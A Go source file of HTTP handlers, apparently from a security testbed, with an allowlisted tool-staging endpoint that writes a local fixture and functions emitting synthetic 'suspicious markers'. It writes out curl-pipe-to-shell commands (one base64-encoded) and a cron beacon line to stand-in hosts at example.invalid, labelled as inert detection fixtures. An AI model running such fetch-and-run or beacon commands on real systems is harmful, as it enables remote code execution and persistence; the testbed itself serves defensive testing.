package handlers

import (
	"encoding/base64"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Static allowlist of trusted tool staging endpoints. Request URLs are never
// passed to http.Get; allowed inputs map to a local fixture adapter.
var allowedFetchTools = map[string]string{
	"https://downloads.example.com/tools/reach-testbed-tool.bin": "reach-testbed-tool",
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	toolID, ok := resolveAllowedFetchTool(source)
	if !ok {
		http.Error(w, "url not allowed", http.StatusBadRequest)
		return
	}

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	if err := os.WriteFile(target, []byte("local-tool-fixture:"+toolID+"\n"), 0o600); err != nil {
		log.Printf("tool staging failed: %v", err)
		http.Error(w, "tool staging failed", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func resolveAllowedFetchTool(raw string) (string, bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", false
	}
	parsed, err := url.Parse(raw)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.RawQuery != "" || parsed.Fragment != "" {
		return "", false
	}
	key := parsed.Scheme + "://" + parsed.Host + parsed.EscapedPath()
	toolID, ok := allowedFetchTools[key]
	return toolID, ok
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
